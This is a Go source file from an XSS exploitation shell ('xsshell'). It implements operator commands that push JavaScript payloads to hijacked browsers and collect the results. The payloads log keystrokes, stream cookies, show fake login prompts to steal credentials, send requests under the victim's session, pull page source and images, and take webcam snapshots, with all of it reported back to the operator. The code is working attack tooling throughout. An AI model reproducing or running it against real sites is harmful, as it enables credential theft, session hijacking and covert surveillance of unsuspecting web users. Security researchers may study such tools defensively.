package shell

import (
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/raz-varren/xsshell/shell/payloads"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
)

var (
	errInvalidArgNum = errors.New("invalid number of arguments")
)

//command management
type cmd struct {
	desc  string
	run   func(s string)
	usage string
}

func (s *Shell) setCMDRunning() {
	s.cmdMu.Lock()
	defer s.cmdMu.Unlock()
	s.cmdRunning = true
}

func (s *Shell) setCMDStopped() {
	s.cmdMu.Lock()
	defer s.cmdMu.Unlock()
	s.cmdRunning = false
}

func (s *Shell) cmdIsRunning() bool {
	s.cmdMu.RLock()
	defer s.cmdMu.RUnlock()
	return s.cmdRunning
}

type listLinkItem struct {
	Text string `json:"text"`
	Href string `json:"href"`
}

func (s *Shell) listLinks(input string) {
	s.sendToTargetsAck(payloads.JSListLinks, func(sock *socket, h *header, data []byte) error {
		var links []listLinkItem
		err := json.Unmarshal(data, &links)
		if err != nil {
			return err
		}

		buf := bytes.NewBuffer(nil)

		if len(links) == 0 {
			buf.WriteString("no links on the page")
		}
		for _, l := range links {
			buf.WriteString(strings.Trim(l.Text, "\n\r\t "))
			buf.WriteString(" -\n\t")
			buf.WriteString(l.Href)
			buf.WriteString("\n\n")
		}

		_, err = s.consoleBufferWrapped(sock, h, tsStr("link list", buf.Bytes()))
		return err
	})
}

func (s *Shell) help(input string) {
	order := make([]string, len(s.cmds))
	sameSame := make(map[*cmd][]string)
	done := make(map[*cmd]bool)
	i := 0
	for k, v := range s.cmds {
		order[i] = k
		sameSame[v] = append(sameSame[v], k)
		i++
	}
	sort.Strings(order)

	longest := 0
	cmdOrdered := []cmdFormat{}
	for _, k := range order {
		cmd := s.cmds[k]
		if done[cmd] {
			continue
		}

		cmdStr := strings.Join(sameSame[cmd], " ")

		if len(cmdStr) > longest {
			longest = len(cmdStr)
		}
		cmdOrdered = append(cmdOrdered, cmdFormat{
			name:  cmdStr,
			desc:  s.cmds[k].desc,
			usage: s.cmds[k].usage,
		})
		done[cmd] = true
	}

	lPad := strings.Repeat(" ", longest+2)
	lPad2 := strings.Repeat(" ", longest+6)
	for _, v := range cmdOrdered {
		padding := longest - len(v.name) + 1
		v.desc = strings.Replace(v.desc, "\n", "\n"+lPad, -1)
		v.usage = strings.Replace(v.usage, "\n", "\n"+lPad2, -1)
		pad := strings.Repeat(" ", padding)
		var out string
		if v.usage != "" {
			out = fmt.Sprintf("%s:%s%s\n%susage: %s\n", v.name, pad, v.desc, lPad2, v.usage)
		} else {
			out = fmt.Sprintf("%s:%s%s\n", v.name, pad, v.desc)
		}
		s.consoleWriteStrPrefix(out)
	}
}

func (s *Shell) quit(input string) {
	s.consoleWriteStr("exitting\n")
	os.Exit(0)
}

func (s *Shell) sendFile(input string) {
	if input == "" {
		s.Err(errors.New("this command requires a js file path"))
		return
	}
	scriptFile := input
	if input[0] != '/' {
		scriptFile = filepath.Join(s.c.WrkDir, input)
	}
	js, err := ioutil.ReadFile(scriptFile)
	if err != nil {
		s.Err(err)
		return
	}

	s.cctx.Set("sendfilelast", scriptFile)

	s.sendToTargetsAck(js, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("send file response", data))
		return err
	})
}

func (s *Shell) sendFileLast(input string) {
	scriptFile := s.cctx.Get("sendfilelast")
	if scriptFile == "" {
		s.Err(errors.New("no previous js file found"))
		return
	}

	js, err := ioutil.ReadFile(scriptFile)
	if err != nil {
		s.Err(err)
		return
	}

	s.sendToTargetsAck(js, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("send file response", data))
		return err
	})
}

func (s *Shell) setTargets(input string) {
	if !validTargetSet(input) {
		s.consoleWriteStrPrefix("invalid target set: " + input)
	}
	s.cctx.Set("targets", input)
}

func (s *Shell) printSockets(input string) {
	s.socketMu.Lock()
	defer s.socketMu.Unlock()

	h := newEmptyHeader()
	if len(s.openSockets) == 0 {
		s.consoleWriteStr("no sockets are connected")
		return
	}
	for k, sock := range s.openSockets {
		if input != "" {
			if k != input {
				continue
			}
		}
		id := sock.id()
		info := sock.info()
		str := fmt.Sprintf(`active socket: %s
    user agent: %s 
    page url:   %s 
    referrer:   %s
    cookies:    %s`, id, info.UserAgent, info.PageURL, info.Referrer, info.Cookies)

		s.consoleWriteStrWrapped(sock, h, str)
	}
}

func (s *Shell) alert(input string) {
	if input == "" {
		s.Err(errors.New("you must provide an alert message to send"))
		return
	}
	js := `var $_$alertMsg = "` + escQuote(input) + "\";\n" + payloads.JSAlertStr
	s.sendToTargets([]byte(js))
}

func (s *Shell) keyLogger(input string) {
	s.sendToTargetsAck(payloads.JSKeyLogger, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("key log", data))
		return err
	})
}

func (s *Shell) pageSource(input string) {
	s.sendToTargetsAck(payloads.JSPageSource, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("page source", data))
		return err
	})
}

func (s *Shell) cookieStream(input string) {
	s.sendToTargetsAck(payloads.JSCookieStream, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("page cookies", data))
		return err
	})
}

func (s *Shell) printExploit(input string) {
	s.consoleWriteStr("\n" + payloads.JSExploitStr + "\n")
}

func (s *Shell) printExploitMin(input string) {
	s.consoleWriteStr("\n" + payloads.JSExploitMinStr + "\n")
}

func (s *Shell) xhr(input string) {
	args := strings.Split(input, " ")
	if len(args) < 2 {
		s.Err(errInvalidArgNum)
		return
	}
	method := args[0]
	if method != http.MethodGet && method != http.MethodPost {
		s.Err(errors.New("only GET and POST methods are allowed"))
		return
	}

	js := payloads.JSXHRStr + "\n"
	switch method {
	case http.MethodPost:
		if len(args) < 4 {
			s.Err(errors.New("POST requests require at least 4 arguments"))
			return
		}
		js = js + fmt.Sprintf(`$_$sendRequest("%s", "%s", "%s");`, escQuote(args[1]), escQuote(args[2]), escQuote(strings.Join(args[3:], " "))) + "\n"
	case http.MethodGet:
		js = js + fmt.Sprintf(`$_$sendRequest("%s");`, escQuote(strings.Join(args[1:], " "))) + "\n"
	}

	s.sendToTargetsAck([]byte(js), func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("xhr response", data))
		return err
	})
}

func (s *Shell) getImages(input string) {
	imgDir := input
	if input == "" || input[0] != '/' {
		imgDir = filepath.Join(s.c.WrkDir, input)
	}

	//write test
	touchFile := filepath.Join(imgDir, ".xsshellwritetest")
	err := ioutil.WriteFile(touchFile, []byte{0}, 0600)
	if err != nil {
		s.Err(err)
		return
	}

	err = os.Remove(touchFile)
	if err != nil {
		s.Err(err)
		return
	}

	s.sendToTargetsAck(payloads.JSGetImages, func(sock *socket, h *header, data []byte) error {
		msg := data
		prefix := []byte("data:image/jpeg;base64,")
		if bytes.HasPrefix(data, prefix) {
			b64Data := data[len(prefix):]
			imgData := make([]byte, base64.StdEncoding.DecodedLen(len(b64Data)))
			n, err := base64.StdEncoding.Decode(imgData, b64Data)
			if err != nil {
				return err
			}
			imgData = imgData[:n]
			imgSumRaw := md5.Sum(imgData)
			imgSum := imgSumRaw[:]

			imgFileName := "xsshell_image_download_" + hex.EncodeToString(imgSum) + ".jpg"
			imgPath := filepath.Join(imgDir, imgFileName)

			if fileExists(imgPath) {
				msg = []byte("skipping already downloaded file: " + imgPath)
			} else {
				err = ioutil.WriteFile(imgPath, imgData, 0600)
				if err != nil {
					return err
				}
				msg = []byte("image downloaded to: " + imgPath)
			}
		}

		_, err := s.consoleBufferWrapped(sock, h, tsStr("image response", msg))
		return err
	})
}

func (s *Shell) promptForLogin(input string) {
	s.sendToTargetsAck(payloads.JSPromptForLogin, func(sock *socket, h *header, data []byte) error {
		_, err := s.consoleBufferWrapped(sock, h, tsStr("prompt for login response", data))
		return err
	})
}

func (s *Shell) enumerateMediaDevices(input string) {
	s.sendToTargetsAck(payloads.JSEnumerateMediaDevices, func(sock *socket, h *header, data []byte) error {
		devices := []mediaDevice{}
		err := json.Unmarshal(data, &devices)
		if err != nil {
			return err
		}

		buf := bytes.NewBuffer(nil)
		for _, d := range devices {
			buf.WriteString("kind:  ")
			buf.WriteString(d.Kind)
			buf.WriteString("\nlabel: ")
			buf.WriteString(d.Label)
			buf.WriteString("\nid:    ")
			buf.WriteString(d.DeviceID)
			buf.WriteString("\ngid:   ")
			buf.WriteString(d.GroupID)
			buf.WriteString("\n\n")
		}

		_, err = s.consoleBufferWrapped(sock, h, tsStr("media devices", buf.Bytes()))
		return err
	})
}

func (s *Shell) webcamSnapshot(input string) {
	imgDir := input
	if input == "" || input[0] != '/' {
		imgDir = filepath.Join(s.c.WrkDir, input)
	}

	//write test
	touchFile := filepath.Join(imgDir, ".xsshellwritetest")
	err := ioutil.WriteFile(touchFile, []byte{0}, 0600)
	if err != nil {
		s.Err(err)
		return
	}

	err = os.Remove(touchFile)
	if err != nil {
		s.Err(err)
		return
	}

	s.sendToTargetsAck(payloads.JSWebcamSnapshot, func(sock *socket, h *header, data []byte) error {
		msg := data
		prefix := []byte("data:image/jpeg;base64,")
		if bytes.HasPrefix(data, prefix) {
			b64Data := data[len(prefix):]
			imgData := make([]byte, base64.StdEncoding.DecodedLen(len(b64Data)))
			n, err := base64.StdEncoding.Decode(imgData, b64Data)
			if err != nil {
				return err
			}
			imgData = imgData[:n]
			imgSumRaw := md5.Sum(imgData)
			imgSum := imgSumRaw[:]

			imgFileName := "xsshell_webcam_download_" + hex.EncodeToString(imgSum) + ".jpg"
			imgPath := filepath.Join(imgDir, imgFileName)

			if fileExists(imgPath) {
				msg = []byte("skipping already downloaded file: " + imgPath)
			} else {
				err = ioutil.WriteFile(imgPath, imgData, 0600)
				if err != nil {
					return err
				}
				msg = []byte("image downloaded to: " + imgPath)
			}
		}

		_, err := s.consoleBufferWrapped(sock, h, tsStr("webcam response", msg))
		return err
	})
}

type mediaDevice struct {
	Kind     string `json:"kind"`
	Label    string `json:"label"`
	GroupID  string `json:"groupId"`
	DeviceID string `json:"deviceId"`
}

type cmdFormat struct {
	name  string
	desc  string
	usage string
}

func escQuote(s string) string {
	return strings.Replace(s, `"`, `\"`, -1)
}

func tsStr(msg string, data []byte) []byte {
	buf := bytes.NewBuffer(nil)
	buf.WriteString(msg + " ")
	buf.WriteString(time.Now().String())
	buf.WriteString(":\n")
	buf.Write(data)

	return buf.Bytes()
}

func fileExists(path string) bool {
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		return true
	}
	return false
}
